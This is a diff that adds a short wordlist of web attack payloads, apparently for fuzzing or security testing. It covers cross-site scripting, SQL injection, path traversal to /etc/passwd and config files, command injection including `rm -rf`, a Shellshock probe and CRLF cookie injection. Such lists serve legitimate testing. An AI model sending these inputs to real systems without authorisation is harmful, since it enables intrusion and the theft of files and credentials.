@@ -1,0 +1,31 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><svg/onload=alert(1)> 
+"><img src=x onerror=alert(1)>
+<script>console.log(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+" OR 1=1 --
+admin'--
+' UNION SELECT NULL--
+../etc/passwd
+../../../../etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/../../../../etc/passwd
+/../../../../../../../etc/hosts
+`cat /etc/passwd`
+${@print('x')}
+() { :; }; echo shellshock
+%00
+%0d%0aSet-Cookie:%20hacked=1
+`rm -rf /tmp/whatever` 
+%27%20OR%201=1--
+/proc/self/environ
+"'; exec('ls') // command-ish
+/../../../../../var/www/html/config.php
+../../../../../../../../windows/win.ini
+<svg><script>updated=1</script></svg>
+alert(String.fromCharCode(88,83,83))
+"><iframe src="javascript:alert(1)"></iframe>
